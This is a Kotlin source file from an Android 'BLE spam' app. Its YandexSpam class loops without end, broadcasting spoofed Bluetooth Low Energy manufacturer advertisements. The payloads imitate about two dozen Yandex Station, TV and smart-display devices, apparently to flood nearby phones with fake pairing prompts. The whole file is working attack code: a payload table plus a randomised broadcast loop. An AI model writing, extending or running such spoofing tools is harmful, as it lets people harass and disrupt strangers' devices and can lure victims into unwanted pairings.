package com.tutozz.blespam

import android.bluetooth.le.AdvertiseData
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class YandexSpam : Spammer {

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private var _isSpamming = false
    private var blinkRunnable: Runnable? = null

    private val advertisePool: Array<AdvertiseData>

    init {
        val companyId = 0x0905

        val payloads = arrayOf(
            "1D3B", // Station 2 BLUE WOT
            "1D4B", // Station 2 Black WOT
            "094B", // Duo Max
            "074B", // Station 2
            "054B", // Station Lite
            "064B", // Station Mini 1
            "1E4B", // Station 3
            "1A4B", // Tv station 2
            "024B", // Station Max
            "124B", // Fiero Hi
            "104B", // Midi
            "114B", // Lite 2 Black WT
            "113B", // Lite 2 BLUE WT
            "134B", // Station Mini 3 pro
            "144B", // Camera
            "154B", // Mini 3
            "164B", // Stret
            "184B", // Tv station Basic
            "044B", // Station Mini 2 WT
            "0F4B", // Smart Display Xiaomi
            "0D4B", // Tv station
            "0A4B", // Xab
            "0C4B"  // Yandex TV
        )

        advertisePool = payloads.map { hex ->
            AdvertiseData.Builder()
                .addManufacturerData(companyId, hexToBytes(hex))
                .build()
        }.toTypedArray()
    }

    override fun start() {
        executor.execute {
            _isSpamming = true
            while (_isSpamming) {
                val advertiser = BluetoothAdvertiser()
                val data = advertisePool.random()
                advertiser.advertise(data, null)
                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (_: InterruptedException) {
                    break
                }
                advertiser.stopAdvertising()
            }
            _isSpamming = false
        }
    }


    override fun stop() {
        _isSpamming = false
    }

    override fun isSpamming(): Boolean = _isSpamming

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable

    private fun hexToBytes(hex: String): ByteArray {
        val cleanHex = hex.uppercase()
        val result = ByteArray(cleanHex.length / 2)
        for (i in result.indices) {
            val index = i * 2
            result[i] = cleanHex.substring(index, index + 2).toInt(16).toByte()
        }
        return result
    }
}